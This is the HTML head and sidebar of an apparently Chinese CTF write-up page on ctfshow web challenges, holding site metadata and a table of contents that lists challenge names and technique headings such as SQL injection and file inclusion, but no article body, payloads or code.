<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="ctfshow之web专题">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow之web专题">
<meta property="og:url" content="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="ctfshow之web专题">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204214741542.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215434905.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215643879.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220259354.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220645090.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221123622.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221222472.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221258839.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221511113.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221552019.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204222916746.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204223406033.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204224151511.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205133922227.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205160729258.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205134649149.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205160944283.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205134800958.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205161104960.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308204915981.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205173413611.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205173512199.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205175046006.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205175208348.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205180453136.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205180831759.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205182654245.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205183351916-1733394833778-6.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241212184937818.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241212185958532.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308212434968.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308213719548.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308214036299.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308214729871.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308221344911.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308221515074.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308231722174.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308231126489.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310151921904.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250310152821259.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310153039724.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310173523034.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310192755074.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310200920613.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310202633671-1741609595157-43.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310203218395-1741609939898-46.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310204336031.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310204707338.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310210111779.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310210855502.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310212922119.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310213510712.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310213614397.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250310213802382.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310213949344.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310214258441.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/02aa69bd8a6c3fd38aff77dbe053af5.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311145931091.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311150109185.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311150139715.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311150554381.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311172721888.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250619130028896.png">
<meta property="article:published_time" content="2025-03-10T14:32:06.000Z">
<meta property="article:modified_time" content="2025-12-01T11:19:20.918Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png">


<link rel="canonical" href="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/","path":"2025/03/10/ctfshow之web专题/","title":"ctfshow之web专题"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ctfshow之web专题 | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02web%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x02web题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">web签到题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="nav-number">2.1.1.</span> <span class="nav-text">#源码泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">2.2.</span> <span class="nav-text">web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.1.</span> <span class="nav-text">#mysql联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">2.3.</span> <span class="nav-text">web3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.3.1.</span> <span class="nav-text">#include文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">2.4.</span> <span class="nav-text">web4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.1.</span> <span class="nav-text">#日志注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">2.5.</span> <span class="nav-text">web5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83MD5"><span class="nav-number">2.5.1.</span> <span class="nav-text">#弱比较MD5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctype-alpha-v1"><span class="nav-number">2.5.2.</span> <span class="nav-text">ctype_alpha($v1)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#is-numeric-v2"><span class="nav-number">2.5.3.</span> <span class="nav-text">is_numeric($v2)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A4%B4%E4%B8%BA0E%EF%BC%88MD5%E5%80%BC%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="nav-number">2.5.4.</span> <span class="nav-text">开头为0E（MD5值碰撞）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">2.6.</span> <span class="nav-text">web6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.6.1.</span> <span class="nav-text">#过滤空格的联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">2.7.</span> <span class="nav-text">web7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.1.</span> <span class="nav-text">#数字型+引号过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">2.8.</span> <span class="nav-text">web8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="nav-number">2.8.1.</span> <span class="nav-text">#布尔盲注+过滤逗号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7"><span class="nav-number">2.8.2.</span> <span class="nav-text">绕过逗号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#from-for"><span class="nav-number">2.8.2.1.</span> <span class="nav-text">from for</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">2.8.3.</span> <span class="nav-text">布尔盲注脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web9"><span class="nav-number">2.9.</span> <span class="nav-text">web9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5%E7%9A%84sql"><span class="nav-number">2.9.1.</span> <span class="nav-text">#MD5的sql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5-SQL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.9.2.</span> <span class="nav-text">MD5 SQL绕过漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#md5-string-raw-%E5%87%BD%E6%95%B0"><span class="nav-number">2.9.2.1.</span> <span class="nav-text">md5(string,raw)函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web10"><span class="nav-number">2.10.</span> <span class="nav-text">web10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="nav-number">2.10.1.</span> <span class="nav-text">#虚拟表构造绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysqli-query-%E5%87%BD%E6%95%B0"><span class="nav-number">2.10.2.</span> <span class="nav-text">mysqli_query()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysqli-num-rows-%E5%87%BD%E6%95%B0"><span class="nav-number">2.10.3.</span> <span class="nav-text">mysqli_num_rows()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#s%E7%AC%A6%E5%8F%B7"><span class="nav-number">2.10.4.</span> <span class="nav-text">\s符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E8%A1%A8with-rollup%E7%BB%95%E8%BF%87"><span class="nav-number">2.10.5.</span> <span class="nav-text">构建虚拟表with rollup绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">2.11.</span> <span class="nav-text">web11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E4%BC%AA%E9%80%A0"><span class="nav-number">2.11.1.</span> <span class="nav-text">#session伪造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">2.12.</span> <span class="nav-text">web12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="nav-number">2.12.1.</span> <span class="nav-text">#绕过disable_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="nav-number">2.13.</span> <span class="nav-text">红包题第二弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">2.13.1.</span> <span class="nav-text">#无数字字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">2.14.</span> <span class="nav-text">web13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.14.1.</span> <span class="nav-text">#.user.ini文件上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">2.15.</span> <span class="nav-text">web14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-mysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.15.1.</span> <span class="nav-text">#无列名注入+mysql读取文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9"><span class="nav-number">2.16.</span> <span class="nav-text">红包题第六弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%A2%B0%E6%92%9E-%E6%96%87%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">2.16.1.</span> <span class="nav-text">#强碰撞+文件竞争</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%B8%83%E5%BC%B9"><span class="nav-number">2.17.</span> <span class="nav-text">红包题第七弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-%E7%BB%95%E8%BF%87disable-function"><span class="nav-number">2.17.1.</span> <span class="nav-text">#.git文件泄露+绕过disable_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%90%8C%E6%96%B0%E4%B8%93%E5%B1%9E%E7%BA%A2%E5%8C%85%E9%A2%98"><span class="nav-number">2.18.</span> <span class="nav-text">萌新专属红包题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="nav-number">2.18.1.</span> <span class="nav-text">#弱口令爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTFshow-web1"><span class="nav-number">2.19.</span> <span class="nav-text">CTFshow web1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.19.1.</span> <span class="nav-text">#布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#game-gyctf-web2"><span class="nav-number">2.20.</span> <span class="nav-text">game-gyctf web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">2.20.1.</span> <span class="nav-text">#反序列化字符串逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web15-Fishman"><span class="nav-number">2.21.</span> <span class="nav-text">web15 Fishman</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">wanTh3flag</p>
  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">173</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">124</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="wanTh3flag">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="root@wanth3f1ag">
